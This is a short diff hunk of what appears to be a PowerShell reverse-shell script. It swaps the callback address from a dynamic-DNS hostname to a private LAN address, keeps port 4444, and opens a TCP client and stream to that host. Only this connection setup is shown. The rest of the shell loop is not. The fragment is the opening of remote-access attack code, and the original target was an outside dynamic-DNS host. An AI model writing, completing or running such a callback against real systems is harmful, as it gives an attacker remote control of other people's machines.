@@ -1,4 +1,4 @@
-$ip = "suber122.duckdns.org"
+$ip = "192.168.1.40"
 $port = 4444
 $socket = New-Object System.Net.Sockets.TcpClient($ip, $port)
 $stream = $socket.GetStream()
